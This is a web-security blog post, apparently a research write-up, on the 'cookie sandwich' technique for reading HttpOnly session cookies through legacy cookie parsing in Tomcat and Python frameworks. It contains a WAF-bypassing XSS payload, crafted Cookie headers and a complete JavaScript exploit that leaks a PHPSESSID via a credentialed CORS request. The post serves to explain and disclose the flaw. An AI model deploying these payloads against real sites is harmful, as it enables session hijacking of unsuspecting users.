---
title: Stealing HttpOnly cookies with the cookie sandwich technique
draft: false
date: 2025-05-31
tags:
  - cookies
  - xss
---

In this post, I will talk about the "cookie sandwich" trick. It can help you get around the HttpOnly flag on some servers. This is based on the idea from "[Bypassing WAFs with the phantom $Version cookie](https://portswigger.net/research/bypassing-wafs-with-the-phantom-version-cookie)." If you look closely, old cookies let you put special characters in the cookie value. We will use this in this post.

## Cookie sandwich

The cookie sandwich trick changes how web servers read and use cookies when special characters are in them. By using quotes and old cookies in a smart way, someone can trick the server into misunderstanding the cookie header. This could let client-side scripts see HttpOnly cookies.

#### How It Works:

Chrome doesn't support old cookies. This lets attackers make a cookie name that starts with a $, like $Version, from JavaScript. Also, you can put quotes in any cookie value. Here's how to make a cookie sandwich to steal a restricted cookie value:

```bash
document.cookie = `$Version=1;`;
document.cookie = `param1="start`;
// any cookies inside the sandwich will be placed into param1 value server-side
document.cookie = `param2=end";`;
```

The Cookie header in the request/response might appear as:

```http
GET / HTTP/1.1
Cookie: $Version=1; param1="start; sessionId=secret; param2=end"
=>
HTTP/1.1 200 OK
Set-Cookie: param1="start; sessionId=secret; param2=end";
```

How Apache Tomcat reads cookie headers:

- The parser uses both
  [RFC6265](https://datatracker.ietf.org/doc/html/rfc6265) and
  [RFC2109](https://datatracker.ietf.org/doc/html/rfc2109) standards. If a string starts with the special
  [$Version](https://github.com/apache/tomcat/blob/4111137da8712add015a4193da0f7d4d9248941e/java/org/apache/tomcat/util/http/parser/Cookie.java%23L147) attribute, it uses the old way of reading it.

- If a cookie value starts with double quotes, it reads until the next double quote that isn't canceled out.

- It also un-does any character that starts with a backslash (\\).

If the application shows the param1 cookie in the response and doesn't have the HttpOnly attribute, the whole cookie string can be seen. This includes any HttpOnly session cookie sent by the browser between param1 and param2.

Python frameworks support quoted strings by default, so you don't need the special $Version attribute. These frameworks also know that the semicolon separates cookie pairs. They automatically change all special characters into a four-character sequence: a forward slash followed by the three-digit octal number for the character. A "cookie sandwich" attack against a Flask application might look like this:

```http
GET / HTTP/1.1
Cookie: param1="start; sessionId=secret; param2=end"
=>
HTTP/1.1 200 OK
Set-Cookie: param1="start\073 sessionId=secret\073 param2=end";
```

## Real world example

Analytics often use cookies or URL parameters to watch what users do. They don't always check the tracking ID. This makes them a good target for the cookie sandwich attack. Usually, when a user visits a site for the first time, the server makes a random string called **visitorId** and puts it in cookies. This **visitorId** is then shown on the webpage for analytics:

```js
<script>
{"visitorId":"deadbeef"}
</script>
```

This can cause problems. If an attacker can see the webpage content, they can get around the HttpOnly cookie flag. This can be done through a [CORS](https://portswigger.net/web-security/cors) request with credentials or an XSS attack.

### Stealing an HttpOnly PHPSESSID cookie

In a test, I found an application with an [XSS](https://portswigger.net/web-security/cross-site-scripting) problem on an error page. I was able to use it to steal an HttpOnly PHPSESSID cookie. I had to get around some security and use a tracking domain problem that was missed.

#### Step 1: Finding the XSS Problem

The application showed certain link and meta attributes without properly cleaning them. This let me put in JavaScript code because the server didn’t properly clean the user input. AWS WAF was being used, but it could be gotten around because of a problem
[oncontentvisibilityautostatechange](https://x.com/garethheyes/status/1854191120277733760). Thanks to [@garethheyes](https://x.com/garethheyes) who helped me with that trick:

```html
<link
  rel="canonical"
  oncontentvisibilityautostatechange="alert(1)"
  style="content-visibility:auto"
/>
```

#### Step 2: Finding the Exposed Cookie Parameter

I could run JavaScript on the page. My next goal was to find an HttpOnly cookie linked to the domain. I didn’t find any analytics JavaScript right away. But I discovered a tracking domain that showed the session ID parameter in the JSON response. This tracking endpoint accepted a session parameter in the URL:

```http
GET /json?session=ignored HTTP/1.1
Host: tracking.example.com
Origin: https://www.example.com
Referer: https://www.example.com/
Cookie:  session=deadbeef;
```

```http
HTTP/2 200 OK
Content-Type: application/json;charset=UTF-8
Access-Control-Allow-Origin: https://www.example.com
Access-Control-Allow-Credentials: true
{"session":"deadbeef"}
```

This website is a good one to use in our attack because:

- it shows the cookie value in the response
- it allows cross origin request from the vulnerable domain

#### Step 3: Using Cookie Downgrade to Steal Information

This tracking application did something interesting. The session URL query parameter is needed, but the server changes its value with the one from the Cookie header. The backend runs on Apache Tomcat, so I used the phantom \$Version cookie to switch to
[RFC2109](https://datatracker.ietf.org/doc/html/rfc2109) and do a cookie sandwich attack. But a problem remained: controlling the order of cookies in the client's request. The $Version cookie had to be sent first. To do this, it had to be created earlier or have a path attribute longer than all other cookies. We can't control when the victim's cookie is created, but we can change the path attribute. The path chosen was /json.

I used a carefully made Cookie header to change the order of cookies and steal the HttpOnly PHPSESSID cookie. Here’s an example of the bad request I used:

```http
`GET /json?session=ignored
Host: tracking.example.com
Origin: https://www.example.com
Referer: https://www.example.com/
Cookie: $Version=1; session="deadbeef; PHPSESSID=secret; dummy=qaz"
```

```http
HTTP/2 200 OK
Content-Type: application/json;charset=UTF-8
Access-Control-Allow-Origin: https://www.example.com
Access-Control-Allow-Credentials: true
{"session":"deadbeef; PHPSESSID=secret; dummy=qaz"}
```

#### Step 4: Putting It All Together

Here’s how the attack works:

- The user visits a page with the oncontentvisibilityautostatechange XSS payload.

- The JavaScript sets cookies $Version=1 and session="deadbeef. Both cookies have Path value /json to change the cookie order.

- Finally, the script adds the cookie dummy=qaz".
- The script then makes a CORS request to the tracking application endpoint. This
  shows the changed PHPSESSID cookie in the JSON response.
  Final exploit:

```js
async function sandwich(target, cookie) {
  // Step 1: Create an iframe with target src and wait for it
  const iframe = document.createElement("iframe")
  const url = new URL(target)
  const domain = url.hostname
  const path = url.pathname
  iframe.src = target
  // Hide the iframe
  iframe.style.display = "none"
  document.body.appendChild(iframe)
  // Optional: Add your code to check and clean client's cookies if needed
  iframe.onload = async () => {
    // Step 2: Create cookie gadget
    document.cookie = `$Version=1; domain=${domain}; path=${path};`
    document.cookie = `${cookie}="deadbeef; domain=${domain}; path=${path};`
    document.cookie = `dummy=qaz"; domain=${domain}; path=/;`
    // Step 3: Send a fetch request
    try {
      const response = await fetch(`${target}`, {
        credentials: "include",
      })
      const responseData = await response.text()
      // Step 4: Alert response
      alert(responseData)
    } catch (error) {
      console.error("Error fetching data:", error)
    }
  }
}
setTimeout(sandwich, 100, "http://example.com/json", "session")
```

With this method, I could get access to the other user session cookie from the JSON response. I used XSS, cookie changes, and the tracking application’s problem.

## Recommendation

Cookie security is important for protecting web applications from attacks. Pay
attention to how cookies are coded and read. Understand how cookies are processed by
the frameworks and browsers you use. Apache Tomcat versions 8.5.x, 9.0.x and 10.0.x
support [RFC2109](https://datatracker.ietf.org/doc/html/rfc2109).
